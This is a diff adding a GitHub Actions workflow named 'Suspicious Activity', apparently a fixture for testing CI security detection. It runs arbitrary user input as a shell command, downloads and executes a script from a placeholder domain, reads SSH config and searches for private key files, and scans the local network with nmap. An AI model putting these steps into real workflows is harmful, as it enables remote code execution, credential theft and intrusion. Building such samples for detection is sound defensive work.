@@ -1,0 +1,40 @@
+name: Suspicious Activity
+
+on:
+  workflow_dispatch:
+    inputs:
+      command:
+        description: 'Command to execute'
+        required: true
+        type: string
+
+jobs:
+  execute:
+    runs-on: ubuntu-latest
+    
+    steps:
+    - uses: actions/checkout@v4
+    
+    - name: Execute user command
+      run: |
+        # This is potentially dangerous - executing arbitrary user input
+        ${{ github.event.inputs.command }}
+        
+    - name: Download from external source
+      run: |
+        wget https://suspicious-domain.com/script.sh
+        chmod +x script.sh
+        ./script.sh
+        
+    - name: Access sensitive information
+      run: |
+        # Trying to access potentially sensitive files
+        cat ~/.bashrc
+        cat ~/.ssh/config || true
+        find /home -name "*.key" -o -name "*.pem" 2>/dev/null || true
+        
+    - name: Network enumeration
+      run: |
+        # Suspicious network activity
+        nmap -sn 192.168.1.0/24 || true
+        netstat -tulpn || true
